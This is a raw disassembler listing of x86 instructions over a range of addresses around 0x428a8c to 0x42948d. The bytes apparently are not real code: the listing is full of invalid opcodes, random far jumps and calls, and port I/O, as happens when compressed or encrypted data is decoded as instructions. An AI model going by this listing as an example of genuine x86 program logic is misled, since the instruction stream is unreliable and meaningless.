  428a8c:	jno    0x428a24
  428a8e:	mov    ebp,DWORD PTR [ebx-0x23]
  428a91:	fdivr  QWORD PTR [edx-0x3ac29f6a]
  428a97:	repz js 0x428a60
  428a9a:	dec    eax
  428a9b:	enter  0x87f1,0x7
  428a9f:	xlat   BYTE PTR ds:[ebx]
  428aa0:	rcl    BYTE PTR [esp+edi*1],cl
  428aa3:	test   BYTE PTR [ebp-0x1c1134c9],al
  428aa9:	push   0xd0847561
  428aae:	stc    
  428aaf:	cdq    
  428ab0:	imul   BYTE PTR [edx]
  428ab2:	and    ch,BYTE PTR [ecx+0x27]
  428ab5:	dec    edi
  428ab6:	cmp    al,0xfb
  428ab8:	xchg   edi,eax
  428ab9:	xchg   ecx,eax
  428aba:	jle    0x428aa6
  428abc:	mov    al,BYTE PTR [ecx-0x5cba17fd]
  428ac2:	daa    
  428ac3:	xor    WORD PTR [ecx-0x21f84ed3],di
  428aca:	mov    eax,ds:0x970a94ca
  428acf:	aad    0xe2
  428ad1:	and    cl,ch
  428ad3:	xchg   edi,eax
  428ad4:	push   eax
  428ad5:	(bad)  
  428ad6:	xchg   esp,eax
  428ad7:	rcl    BYTE PTR [ebp+0x76ee1fcc],0xca
  428ade:	mov    es,eax
  428ae0:	mov    ch,0x36
  428ae2:	aad    0xb1
  428ae4:	test   al,0xb5
  428ae6:	sub    esi,0x6ce3e52d
  428aec:	adc    al,0x35
  428aee:	neg    BYTE PTR [edx-0x16]
  428af1:	ja     0x428b19
  428af3:	xor    al,0xb5
  428af5:	hlt    
  428af6:	cmp    BYTE PTR [edi-0x5d],ah
  428af9:	out    dx,al
  428afa:	ffreep st(7)
  428afc:	push   ds
  428afd:	jbe    0x428aae
  428aff:	stos   DWORD PTR es:[edi],eax
  428b00:	push   es
  428b01:	jne    0x428af8
  428b03:	mov    edi,0x8277e1f1
  428b08:	xchg   ebx,eax
  428b09:	call   DWORD PTR [esi+0x2e70db74]
  428b0f:	cdq    
  428b10:	push   ss
  428b11:	aad    0xdd
  428b13:	and    BYTE PTR [ebp+0x5ca6bd5d],bl
  428b19:	xor    dl,dh
  428b1b:	cmp    DWORD PTR [ecx],edi
  428b1d:	int3   
  428b1e:	mov    eax,0xc2ef6ecf
  428b23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b24:	int3   
  428b25:	fimul  DWORD PTR [edi-0x21251224]
  428b2b:	dec    ecx
  428b2c:	jnp    0x428af0
  428b2e:	xor    ebp,DWORD PTR [eax]
  428b30:	sbb    DWORD PTR ds:0x3875e3b8,edx
  428b36:	jb     0x428b8a
  428b38:	std    
  428b39:	jmp    0x428b8b
  428b3b:	cld    
  428b3c:	xchg   edx,eax
  428b3d:	aaa    
  428b3e:	mov    WORD PTR [ebx],cs
  428b40:	add    eax,0xb76e54df
  428b45:	or     BYTE PTR [edi-0x2e],ah
  428b48:	pop    esp
  428b49:	dec    ecx
  428b4a:	out    dx,eax
  428b4b:	aad    0x4b
  428b4d:	test   DWORD PTR [ecx+0x20f7e171],edx
  428b53:	push   edi
  428b54:	jbe    0x428b47
  428b56:	dec    ebx
  428b57:	std    
  428b58:	sar    DWORD PTR [esi-0x5ab415bd],cl
  428b5e:	xor    ebx,ecx
  428b60:	and    dl,0x11
  428b63:	dec    edi
  428b64:	pop    esi
  428b65:	jne    0x428b52
  428b67:	into   
  428b68:	pop    edx
  428b69:	xor    eax,0xbde0e4f4
  428b6e:	jno    0x428b4a
  428b70:	pcmpgtd mm0,QWORD PTR [esi-0x10]
  428b74:	mov    ebp,0xa61f2bc7
  428b79:	ss xchg ecx,eax
  428b7b:	out    dx,eax
  428b7c:	shl    cl,1
  428b7e:	loope  0x428b84
  428b80:	xchg   edi,ebp
  428b82:	cwde   
  428b83:	call   0xad7:0x62979f2d
  428b8a:	mov    ebp,0xc2038c76
  428b8f:	mov    WORD PTR [eax],es
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xb045fa35
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	pop    ds
  428c0d:	addr16 pop edx
  428c0f:	dec    esi
  428c10:	inc    edi
  428c11:	sbb    DWORD PTR [eax+0x2b],ebp
  428c14:	or     dl,BYTE PTR [esi-0x75]
  428c17:	cdq    
  428c18:	push   edx
  428c19:	rcl    bl,cl
  428c1b:	dec    edi
  428c1c:	sbb    BYTE PTR [ebx-0x55],cl
  428c1f:	sbb    ebp,edi
  428c21:	mov    BYTE PTR [ebp-0x8],ah
  428c24:	push   ebp
  428c25:	inc    ebx
  428c26:	mov    al,0x13
  428c28:	xchg   edx,eax
  428c29:	sub    DWORD PTR [ecx-0x4c],eax
  428c2c:	test   DWORD PTR [ebp-0x5223d302],eax
  428c32:	cwde   
  428c33:	xchg   ebp,eax
  428c34:	mov    ebp,0xb934e57d
  428c39:	dec    esi
  428c3a:	sub    eax,0xb80f1d65
  428c3f:	push   edx
  428c40:	sahf   
  428c41:	jbe    0x428c4d
  428c43:	mov    al,ds:0x61a3ea5d
  428c48:	and    dl,BYTE PTR [ecx-0x3f]
  428c4b:	xchg   esi,eax
  428c4c:	inc    esp
  428c4d:	mov    ds:0xf3efaea7,eax
  428c52:	aas    
  428c53:	xor    ch,BYTE PTR ds:0x95e80477
  428c59:	adc    al,ch
  428c5b:	shr    eax,cl
  428c5d:	push   ebp
  428c5e:	in     al,dx
  428c5f:	adc    BYTE PTR [edi+0x15b9784d],ch
  428c65:	sub    ebx,eax
  428c67:	fimul  DWORD PTR [ecx]
  428c69:	push   cs
  428c6a:	jmp    0xa567:0x78b0902c
  428c71:	(bad)  
  428c72:	das    
  428c73:	jb     0x428ccd
  428c75:	pop    ebx
  428c76:	mov    eax,0xc9d299bf
  428c7b:	mov    eax,fs
  428c7d:	mov    dh,0x2b
  428c7f:	aaa    
  428c80:	(bad)  
  428c81:	enter  0x26dc,0x42
  428c85:	retf   0x633b
  428c88:	retf   
  428c89:	enter  0xa506,0x92
  428c8d:	push   esi
  428c8e:	and    DWORD PTR [eax],edi
  428c90:	loop   0x428c63
  428c92:	test   al,0xa2
  428c94:	mov    WORD PTR [eax-0x5c],fs
  428c97:	jmp    0x351e:0xaf14f13d
  428c9e:	sub    al,0x67
  428ca0:	xor    BYTE PTR [eax+0x4cbd37ec],dh
  428ca6:	outs   dx,BYTE PTR ds:[esi]
  428ca7:	loope  0x428c78
  428ca9:	push   0x83af005b
  428cae:	fdivr  QWORD PTR [bp+si+0x4834]
  428cb3:	adc    esi,esi
  428cb5:	jns    0x428ca2
  428cb7:	mov    bh,0xdd
  428cb9:	mov    DWORD PTR [edi+0x46],ebp
  428cbc:	add    edx,DWORD PTR [edx]
  428cbe:	stos   BYTE PTR es:[edi],al
  428cbf:	xchg   edi,eax
  428cc0:	sbb    bh,0xd3
  428cc3:	mov    eax,ds:0xcb6221b
  428cc8:	repz xchg esp,eax
  428cca:	fdiv   QWORD PTR [edx+eiz*2-0x3193cb99]
  428cd1:	data16 cmp bl,BYTE PTR [edx-0x15]
  428cd5:	cmp    al,0xdc
  428cd7:	jnp    0x428cba
  428cd9:	pusha  
  428cda:	std    
  428cdb:	repnz popa 
  428cdd:	adc    ecx,DWORD PTR [esi+0x23]
  428ce0:	cmp    eax,DWORD PTR [ebx-0xcbf68b8]
  428ce6:	fcomp  QWORD PTR es:[esi-0x6c]
  428cea:	sbb    eax,0x7ae890ef
  428cef:	push   ecx
  428cf0:	aas    
  428cf1:	repnz cdq 
  428cf3:	xlat   BYTE PTR ds:[ebx]
  428cf4:	test   al,0xe1
  428cf6:	sub    ebp,esp
  428cf8:	and    dh,BYTE PTR [ebp+0x7a]
  428cfb:	cmp    esi,DWORD PTR [ebx+0x3a]
  428cfe:	(bad)  
  428cff:	xor    esp,DWORD PTR [ebp+0x1cbdf62a]
  428d05:	sbb    DWORD PTR [ebx],edi
  428d07:	push   esi
  428d08:	clc    
  428d09:	xor    ah,BYTE PTR [ebp-0x59a27576]
  428d0f:	retf   0x0
	...
  428d72:	add    BYTE PTR [eax],al
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xeacd
  428d82:	mov    WORD PTR [ecx],fs
  428d84:	pop    eax
  428d85:	mov    ah,0x1
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	and    eax,0x4ed250cf
  428d91:	outs   dx,DWORD PTR ds:[esi]
  428d92:	in     eax,dx
  428d93:	cmp    al,BYTE PTR ss:[eax+0x27]
  428d97:	imul   DWORD PTR [ebp+0x6e8fc93c]
  428d9d:	inc    edx
  428d9e:	fsub   st,st(5)
  428da0:	xchg   edi,eax
  428da1:	loopne 0x428d27
  428da3:	cmp    ah,ch
  428da5:	or     al,0xc2
  428da7:	jl     0x428d94
  428da9:	sbb    eax,DWORD PTR [edi-0x59]
  428dac:	xor    al,0xf3
  428dae:	repz jne 0x428dd9
  428db1:	mov    ds:0xde9d5f52,eax
  428db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428db7:	repnz inc ebp
  428db9:	add    esi,DWORD PTR [edi+eiz*8]
  428dbc:	inc    eax
  428dbd:	adc    cl,BYTE PTR ds:0x8f60fc64
  428dc3:	mov    ds:0x9ce0fca4,al
  428dc8:	retf   
  428dc9:	adc    eax,0xdd80b6d9
  428dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428dcf:	xlat   BYTE PTR ds:[ebx]
  428dd0:	rol    BYTE PTR [ebx+0x74],0x8f
  428dd4:	add    DWORD PTR [ebp-0x5d],0x4f
  428dd8:	stc    
  428dd9:	in     al,0xa
  428ddb:	sti    
  428ddc:	call   0xa35:0x1c84b3e6
  428de3:	push   edi
  428de4:	add    edx,DWORD PTR [esi+0x2a]
  428de7:	ror    BYTE PTR [edx],cl
  428de9:	es cs adc al,0xe1
  428ded:	mov    dl,0x8
  428def:	ins    BYTE PTR es:[edi],dx
  428df0:	xor    DWORD PTR [edi],ebx
  428df2:	clc    
  428df3:	mov    ebp,DWORD PTR [ebp-0xa]
  428df6:	xor    DWORD PTR [ebp-0x40bfeb78],eax
  428dfc:	add    BYTE PTR [edi],0x70
  428dff:	daa    
  428e00:	jnp    0x428e2a
  428e02:	mov    edx,0x1be98677
  428e07:	sar    BYTE PTR [eax+0x51],0x7e
  428e0b:	std    
  428e0c:	nop
  428e0d:	das    
  428e0e:	add    bl,BYTE PTR [ecx]
  428e10:	adc    DWORD PTR [ebx+0x4c51272],0x4e3ba224
  428e1a:	add    eax,0xe2926910
  428e1f:	mov    esi,0xa0db3b5a
  428e24:	sti    
  428e25:	cli    
  428e26:	cmp    eax,0x17c7a904
  428e2b:	sbb    dl,BYTE PTR [esi]
  428e2d:	(bad)  
  428e2e:	mov    ecx,0x1de81a66
  428e33:	rol    DWORD PTR [eax+edx*1],0xd2
  428e37:	fistp  QWORD PTR [edx-0x2c863247]
  428e3d:	pop    es
  428e3e:	rcl    BYTE PTR [esi-0x6cd7c80b],1
  428e44:	mov    cl,0xe3
  428e46:	or     al,BYTE PTR [ecx+0xa]
  428e49:	xchg   BYTE PTR [edi-0x43],cl
  428e4c:	mov    ch,0x6
  428e4e:	repz and al,0x7d
  428e51:	jmp    0xf83d790c
  428e56:	mov    edx,0x16ba74e8
  428e5b:	scas   eax,DWORD PTR es:[edi]
  428e5c:	or     bh,BYTE PTR [eax]
  428e5e:	fnstcw WORD PTR [ebp-0x34]
  428e61:	repz aad 0xc8
  428e64:	dec    esi
  428e65:	shl    DWORD PTR [edi],cl
  428e67:	adc    BYTE PTR [ebx-0x7c],ah
  428e6a:	push   ebx
  428e6b:	test   eax,0xb20263a5
  428e70:	rcr    ebp,1
  428e72:	sbb    ch,bl
  428e74:	shl    BYTE PTR [edi],0xb7
  428e77:	in     al,0xf
  428e79:	pop    esi
  428e7a:	(bad)  
  428e7b:	hlt    
  428e7c:	daa    
  428e7d:	adc    ebx,DWORD PTR [ecx+ebp*1]
  428e80:	mov    dl,BYTE PTR [eax]
  428e82:	pop    edx
  428e83:	mov    WORD PTR [eax],ss
  428e85:	outs   dx,BYTE PTR ds:[esi]
  428e86:	adc    DWORD PTR [edx+0x1aa3a15c],edx
  428e8c:	sar    DWORD PTR [ebx-0x56],0x74
	...
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x8c
  428f01:	mov    WORD PTR [edi-0x36],fs
  428f04:	pop    esp
  428f05:	mov    ch,0x1
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	xor    DWORD PTR [ebp-0x41],0xfa2f6c03
  428f13:	dec    ebp
  428f14:	aam    0xb7
  428f16:	sbb    DWORD PTR [ecx+0x5279554],eax
  428f1c:	(bad)
  428f1f:	sbb    BYTE PTR [ebp-0x66],al
  428f22:	(bad)  
  428f23:	mov    ecx,0x13d4e7aa
  428f28:	daa    
  428f29:	test   BYTE PTR [ebx-0x4d],bh
  428f2c:	pop    ecx
  428f2d:	loopne 0x428f1d
  428f2f:	push   eax
  428f30:	outs   dx,BYTE PTR ds:[esi]
  428f31:	(bad)  
  428f32:	cwde   
  428f33:	repz in eax,dx
  428f35:	xor    al,0xf9
  428f37:	xchg   ecx,eax
  428f38:	out    dx,al
  428f39:	shl    ah,1
  428f3b:	jbe    0x428ebd
  428f3d:	xlat   BYTE PTR ds:[ebx]
  428f3e:	sub    dh,ch
  428f40:	adc    DWORD PTR [eax-0x763d7978],ebp
  428f46:	stc    
  428f47:	rcl    BYTE PTR [edx],1
  428f49:	mov    dl,0xff
  428f4b:	push   ss
  428f4c:	mov    ecx,0x5fc55f26
  428f51:	mov    al,0x86
  428f53:	inc    eax
  428f54:	test   BYTE PTR [edx-0x4c],cl
  428f57:	out    0x96,al
  428f59:	scas   al,BYTE PTR es:[edi]
  428f5a:	sub    ebp,eax
  428f5c:	dec    ecx
  428f5d:	add    ebx,ebx
  428f5f:	inc    ebx
  428f60:	cmp    al,ch
  428f62:	sub    al,0x81
  428f64:	adc    esi,esi
  428f66:	rol    BYTE PTR [eax+0x62],cl
  428f69:	jnp    0x428fbe
  428f6b:	dec    edi
  428f6c:	and    al,0x38
  428f6e:	pop    DWORD PTR [edi]
  428f70:	popa   
  428f71:	mov    esp,0xba974d30
  428f76:	add    dl,BYTE PTR [esi]
  428f78:	mov    ebp,0x325ab22d
  428f7d:	shl    DWORD PTR [ebp+0x424a530e],1
  428f83:	in     eax,dx
  428f84:	pop    ebx
  428f85:	inc    esi
  428f86:	xchg   DWORD PTR [esi+0x7b],esp
  428f89:	push   cs
  428f8a:	adc    al,0x7
  428f8c:	inc    edi
  428f8d:	mov    BYTE PTR [ebx-0x40],bl
  428f90:	inc    ecx
  428f91:	or     al,0xf2
  428f93:	enter  0x597c,0xfb
  428f97:	push   0x53
  428f99:	out    0x96,eax
  428f9b:	mov    BYTE PTR [eax-0x7],ch
  428f9e:	mov    ebx,0xf597be85
  428fa3:	sahf   
  428fa4:	ret    0x5d22
  428fa7:	mov    gs,esp
  428fa9:	mov    ebx,0xcf327d47
  428fae:	add    edi,DWORD PTR [ecx+0x20]
  428fb1:	add    eax,0xb13fdf0c
  428fb6:	je     0x428ffb
  428fb8:	pop    es
  428fb9:	inc    ebp
  428fba:	dec    edi
  428fbb:	sub    eax,0x4585b41f
  428fc0:	or     edx,DWORD PTR [edi+0x55]
  428fc3:	pop    eax
  428fc4:	in     al,0x31
  428fc6:	mov    ebx,0x44180077
  428fcb:	fild   WORD PTR [eax]
  428fcd:	aam    0xc5
  428fcf:	idiv   DWORD PTR [ebp+0x3dcf9ae]
  428fd5:	pop    esi
  428fd6:	ins    BYTE PTR es:[edi],dx
  428fd7:	(bad)  [edi+0x75b8aef5]
  428fdd:	(bad)  
  428fde:	mov    eax,0x9171d5b
  428fe3:	call   0x2bb5:0x4e4aa627
  428fea:	mov    ecx,0xc2689e96
  428fef:	inc    edi
  428ff0:	xchg   edi,eax
  428ff1:	xor    al,0xb1
  428ff3:	ja     0x42904c
  428ff5:	xchg   esp,eax
  428ff6:	mov    al,0x18
  428ff8:	out    dx,al
  428ff9:	sub    cl,bh
  428ffb:	sub    ah,BYTE PTR [edx+0x1d]
  428ffe:	icebp  
  428fff:	call   0x5ebc:0x3a363d54
  429006:	aas    
  429007:	pop    ds
  429008:	adc    BYTE PTR [ecx-0x6a88d5],0x40
  42900f:	test   BYTE PTR [eax],al
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x98fc7b77
  429081:	mov    eax,0xb6609625
  429086:	add    DWORD PTR [eax],eax
  429088:	add    al,0x1
  42908a:	add    BYTE PTR [eax],al
  42908c:	jnp    0x4290fe
  42908e:	mov    DWORD PTR [ecx-0x5c987690],edi
  429094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429095:	test   bp,0x3795
  42909a:	pop    esp
  42909b:	iret   
  42909c:	push   edx
  42909d:	in     al,dx
  42909e:	sbb    DWORD PTR [esp+edx*2-0x34f1468a],0x7a
  4290a6:	mov    DWORD PTR [edx-0x60],edi
  4290a9:	rol    ecx,cl
  4290ab:	sub    esi,edx
  4290ad:	cmp    DWORD PTR [ecx+0x34],ecx
  4290b0:	and    DWORD PTR [esp+esi*1-0x19],eax
  4290b4:	xchg   esi,eax
  4290b5:	xchg   esi,eax
  4290b6:	aas    
  4290b7:	icebp  
  4290b8:	mov    BYTE PTR [ebp+0x752af87b],bl
  4290be:	xor    edx,edi
  4290c0:	leave  
  4290c1:	pop    ebx
  4290c2:	sbb    eax,0xd3b57ff7
  4290c7:	lods   al,BYTE PTR ds:[esi]
  4290c8:	arpl   WORD PTR [edx],bp
  4290ca:	loopne 0x42910c
  4290cc:	or     ebx,DWORD PTR [eax+0x6c5029d9]
  4290d2:	and    BYTE PTR [eax+0x29],0x7a
  4290d6:	clc    
  4290d7:	adc    al,0xaf
  4290da:	fwait
  4290db:	enter  0xe0a9,0xfa
  4290df:	mov    dh,0xde
  4290e1:	jne    0x429126
  4290e3:	and    eax,0xc3070f3a
  4290e8:	xchg   edi,eax
  4290e9:	jb     0x4290fe
  4290eb:	cmp    bh,ah
  4290ed:	xchg   edx,eax
  4290ee:	xchg   ebp,eax
  4290ef:	(bad)  
  4290f0:	mov    al,gs:0xbf90eeb
  4290f6:	data16 mov cl,0xf
  4290f9:	mov    al,0x60
  4290fb:	(bad)  
  4290fc:	aam    0xa4
  4290fe:	aaa    
  4290ff:	aad    0xa
  429101:	adc    edx,DWORD PTR [edx-0x2f]
  429104:	aas    
  429105:	loope  0x42909f
  429107:	popa   
  429108:	rcr    cl,cl
  42910a:	enter  0xc464,0xe4
  42910e:	add    BYTE PTR [edi-0x10],dl
  429111:	pop    esp
  429112:	mov    WORD PTR [ebx+0x56],?
  429115:	gs pop esp
  429117:	das    
  429118:	adc    al,0x47
  42911a:	jbe    0x4290c1
  42911c:	push   0xffffffc8
  42911e:	in     al,dx
  42911f:	or     cl,BYTE PTR [edi-0xf]
  429122:	cmp    eax,0x5c558036
  429127:	stos   DWORD PTR es:[edi],eax
  429128:	hlt    
  429129:	mov    dl,BYTE PTR ds:[edi-0xa633447]
  429130:	icebp  
  429131:	mov    ecx,0xb2ff2cb5
  429136:	fstp   TBYTE PTR [esi]
  429138:	jl     0x4291b3
  42913a:	jge    0x4291ad
  42913c:	cmp    BYTE PTR [ebx+0x56753a62],0x4c
  429143:	mov    ds:0xaf7ae8,eax
  429148:	das    
  429149:	hlt    
  42914a:	ret    
  42914b:	fcmovnbe st,st(5)
  42914d:	push   es
  42914e:	loope  0x429195
  429150:	xchg   BYTE PTR fs:[eax+0x7b],bl
  429154:	ja     0x4291a3
  429156:	mov    WORD PTR [edi-0x4e],ds
  429159:	jg     0x42919a
  42915b:	(bad)  
  42915d:	sbb    BYTE PTR [eax-0x78ba354b],ch
  429163:	xor    DWORD PTR [edi-0x1b],eax
  429166:	mov    esp,0xf01700d6
  42916b:	inc    esp
  42916c:	cwde   
  42916d:	ins    BYTE PTR es:[edi],dx
  42916e:	push   ecx
  42916f:	mov    al,ds:0x1ee0eb
  429174:	pop    ss
  429175:	cmp    BYTE PTR [esi+0x3cbda7a5],0x87
  42917c:	mul    DWORD PTR [edx+0x68]
  42917f:	rcr    BYTE PTR [edx],1
  429181:	or     BYTE PTR [esi],cl
  429183:	xchg   ebp,eax
  429184:	pop    eax
  429185:	retf   
  429186:	cmp    bh,BYTE PTR [edx]
  429188:	imul   edi,ebp,0xffffffc4
  42918b:	push   ds
  42918c:	sti    
  42918d:	int3   
  42918e:	jbe    0x4291aa
	...
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ebx+esi*2+0x642389d0],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    ah,ah
  42920d:	js     0x429210
  42920f:	pop    es
  429210:	je     0x429232
  429212:	sti    
  429213:	dec    edx
  429214:	pop    ebp
  429215:	push   edx
  429216:	sub    eax,0xc8a112a3
  42921b:	bswap  edx
  42921d:	cdq    
  42921e:	add    al,0x28
  429220:	jmp    0xc20a:0xee442e70
  429227:	sub    BYTE PTR [ebx],bh
  429229:	stos   BYTE PTR es:[edi],al
  42922a:	retf   
  42922b:	rcr    DWORD PTR [eax+0x7],1
  42922e:	loopne 0x429252
  429230:	xor    eax,0x3a2d975c
  429235:	dec    edi
  429236:	out    0xa3,eax
  429238:	dec    ecx
  429239:	mov    ah,0x86
  42923b:	cmp    eax,0x72faa355
  429240:	sub    eax,0xc47a8f74
  429245:	retf   0xb2f4
  429248:	xchg   ebp,eax
  429249:	adc    ebx,DWORD PTR [edi]
  42924b:	xchg   ebx,eax
  42924c:	and    al,0xeb
  42924e:	xor    esp,DWORD PTR [ebx+0x1a2ffbfa]
  429254:	jle    0x429233
  429256:	jae    0x42920d
  429258:	sbb    al,0x6c
  42925a:	cs mov edi,0xdb8bc2d5
  429260:	(bad)  
  429261:	cmp    cl,BYTE PTR [edx]
  429263:	mov    dh,0x4b
  429265:	mov    bl,0x1c
  429267:	inc    esp
  429268:	pop    edx
  429269:	mov    esi,DWORD PTR [edx]
  42926b:	push   es
  42926c:	sbb    ch,dh
  42926e:	add    eax,0x1f111103
  429273:	sti    
  429274:	int3   
  429275:	mov    al,0x6c
  429277:	std    
  429278:	push   ds
  429279:	ss cmp eax,0x6bdb3c3e
  42927f:	or     edi,0xf6fcf5ff
  429285:	test   al,ah
  429287:	aad    0xa8
  429289:	sub    eax,0x5e38e566
  42928e:	repnz sub BYTE PTR [ebx+ecx*1-0x75],al
  429293:	dec    ecx
  429294:	jmp    0xa855:0xe05c174e
  42929b:	adc    al,0xe3
  42929d:	leave  
  42929e:	outs   dx,DWORD PTR ds:[esi]
  42929f:	repz int 0x52
  4292a2:	(bad)  
  4292a3:	mov    esp,0x41a10e00
  4292a8:	bound  edi,QWORD PTR [edx]
  4292aa:	inc    esi
  4292ab:	add    bh,BYTE PTR [ecx+0x2a]
  4292ae:	in     al,0xcd
  4292b0:	pop    eax
  4292b1:	mov    al,ds:0x4baf55c7
  4292b6:	mov    ah,0xbf
  4292b8:	test   edx,edx
  4292ba:	lods   eax,DWORD PTR ds:[esi]
  4292bb:	pop    esp
  4292bc:	(bad)  
  4292bd:	sbb    bl,dl
  4292bf:	xor    bl,dl
  4292c1:	cmp    BYTE PTR [esi-0x22189afe],ah
  4292c7:	jecxz  0x42924b
  4292c9:	dec    ebx
  4292ca:	dec    ebp
  4292cb:	jno    0x4292cb
  4292cd:	add    eax,0x5c34e837
  4292d2:	sub    DWORD PTR [eax-0x24],ecx
  4292d5:	in     al,0x3e
  4292d7:	pop    esi
  4292d8:	ficomp DWORD PTR [eax+0x40]
  4292db:	dec    ebx
  4292dc:	ins    DWORD PTR es:[edi],dx
  4292dd:	xor    al,0x34
  4292df:	pop    ebp
  4292e0:	lods   al,BYTE PTR ds:[esi]
  4292e1:	adc    edx,edx
  4292e3:	(bad)  
  4292e4:	mov    cl,0x9a
  4292e6:	pushf  
  4292e7:	pop    ebp
  4292e8:	es mov esp,0x1477a2ee
  4292ee:	enter  0xd0a,0xcf
  4292f2:	ret    0xc0da
  4292f5:	xor    dh,0x6f
  4292f8:	enter  0x5a74,0xac
  4292fc:	call   0xe6f3:0x11b5f5d0
  429303:	adc    ebx,ebp
  429305:	mov    bl,0x5f
  429307:	mov    dl,0x36
  429309:	adc    bl,BYTE PTR [ebp+0x15e757f]
  42930f:	inc    eax
	...
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xdd
  429381:	mov    BYTE PTR [eax-0x7a],ah
  429384:	push   0x40001b8
  429389:	add    DWORD PTR [eax],eax
  42938b:	add    BYTE PTR [esi-0x67],ah
  42938e:	(bad)  
  42938f:	push   ecx
  429390:	mov    DWORD PTR [ebx+0x3a29cb9a],ecx
  429396:	dec    ebx
  429397:	pusha  
  429398:	fwait
  429399:	pop    ecx
  42939a:	jmp    0x5d945c47
  42939f:	pop    esi
  4293a0:	(bad)  
  4293a1:	jns    0x42938f
  4293a3:	xor    al,0x2
  4293a5:	fs inc ebp
  4293a7:	sub    bl,BYTE PTR [ebx-0x7f]
  4293aa:	sbb    edi,esp
  4293ac:	add    ah,ch
  4293ae:	test   BYTE PTR [ecx],0x35
  4293b1:	jb     0x429431
  4293b3:	into   
  4293b4:	sahf   
  4293b5:	fwait
  4293b6:	cmp    DWORD PTR [edx],edx
  4293b8:	pop    es
  4293b9:	test   edx,eax
  4293bb:	stos   DWORD PTR es:[edi],eax
  4293bc:	sub    DWORD PTR [eax+0x55b9e391],esp
  4293c2:	sahf   
  4293c3:	jmp    0x42938e
  4293c5:	jo     0x4293be
  4293c7:	dec    edi
  4293c8:	jo     0x429417
  4293ca:	mov    DWORD PTR [ebp-0x35],0x65b251e2
  4293d1:	or     ecx,DWORD PTR [esi+0x6860e04b]
  4293d7:	xchg   ebx,eax
  4293d8:	and    edi,DWORD PTR [esi+ebx*2+0x3e69f152]
  4293df:	rcr    DWORD PTR [ecx],1
  4293e1:	adc    eax,0x70e3f986
  4293e6:	mov    dl,BYTE PTR [esi+0x4b]
  4293e9:	xchg   esp,eax
  4293ea:	cmp    esp,DWORD PTR [edi-0x40]
  4293ed:	daa    
  4293ee:	jl     0x429397
  4293f0:	sub    bl,BYTE PTR [ebp-0x198e84de]
  4293f6:	push   edi
  4293f7:	inc    ebx
  4293f8:	test   BYTE PTR [ebx],al
  4293fa:	and    BYTE PTR [edi+eax*4+0x61],bh
  4293fe:	cmp    ebp,DWORD PTR [ebx+ebx*2-0x30]
  429402:	xor    DWORD PTR [esi],ebp
  429404:	mov    ecx,?
  429406:	cmp    al,0xf2
  429408:	scas   al,BYTE PTR es:[edi]
  429409:	stos   BYTE PTR es:[edi],al
  42940a:	jp     0x429465
  42940c:	dec    esi
  42940d:	retf   
  42940e:	dec    ebx
  42940f:	sti    
  429410:	retf   0xe3e8
  429413:	sar    BYTE PTR [esi],cl
  429415:	xchg   ebp,eax
  429416:	push   eax
  429417:	mov    ah,0x30
  429419:	cmp    al,0x17
  42941b:	lods   eax,DWORD PTR ds:[esi]
  42941c:	arpl   WORD PTR [ebx-0x76],si
  42941f:	scas   al,BYTE PTR es:[edi]
  429420:	test   BYTE PTR [esi-0x6a],ah
  429423:	cs mov bl,0xc0
  429426:	pop    esi
  429427:	and    BYTE PTR [edx-0x57],dh
  42942a:	daa    
  42942b:	jnp    0x4293e9
  42942d:	push   cs
  42942e:	cmc    
  42942f:	add    ebp,DWORD PTR [ebx+0x25]
  429432:	xor    bl,dh
  429434:	adc    ebx,DWORD PTR [ebx+0x10]
  429437:	add    eax,0xb07b0749
  42943c:	jns    0x4293c9
  42943e:	leave  
  42943f:	lock add DWORD PTR cs:[ebp+0x7d],eax
  429444:	idiv   DWORD PTR [edx+0x3]
  429447:	dec    ebx
  429448:	ss sbb al,0xaf
  42944b:	dec    eax
  42944c:	xor    ah,dh
  42944e:	fyl2x  
  429450:	inc    ebp
  429451:	ss fmul st(7),st
  429454:	scas   al,BYTE PTR es:[edi]
  429455:	test   BYTE PTR [edx+0x206e6ce9],bh
  42945b:	outs   dx,BYTE PTR ds:[esi]
  42945c:	cs stos DWORD PTR es:[edi],eax
  42945e:	into   
  42945f:	icebp  
  429460:	adc    al,BYTE PTR [esi+0x4be41942]
  429466:	mov    ebx,0x9fddee1
  42946b:	jb     0x42948d
  42946d:	sti    
  42946e:	pop    es
  42946f:	xchg   edx,edi
  429471:	and    BYTE PTR [ecx-0x73bba31b],0x59
  429478:	adc    al,0x72
  42947a:	push   ebx
  42947b:	daa    
  42947c:	cmp    eax,0xe80ff378
  429481:	or     bh,ah
  429483:	push   cs
  429484:	sahf   
  429485:	jg     0x42943c
  429487:	add    ch,BYTE PTR [edi-0xcb12c07]
  42948d:	and    esi,DWORD PTR [esi+0x9]
	...
